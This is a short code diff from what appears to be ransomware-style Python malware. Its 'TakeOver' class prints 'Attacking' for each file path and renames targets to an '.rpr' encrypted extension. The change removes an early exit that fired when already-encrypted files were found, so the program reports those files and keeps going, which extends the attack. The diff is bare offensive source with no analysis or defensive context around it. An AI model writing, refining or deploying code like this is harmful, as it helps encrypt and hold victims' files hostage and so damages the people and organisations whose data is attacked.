@@ -49,8 +49,7 @@ class TakeOver():
       # Change file ext
       ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
       if ext == ".rpr":
-        print("Files are already encrypted, quitting...")
-        sys.exit()
+        print(f"{i} is already encrypted")
       print(f"Attacking: {PATH}")
       self.rpr_file = i.replace(ext, '.rpr')
       ENC_FILE = f"{directory}/{self.rpr_file}"
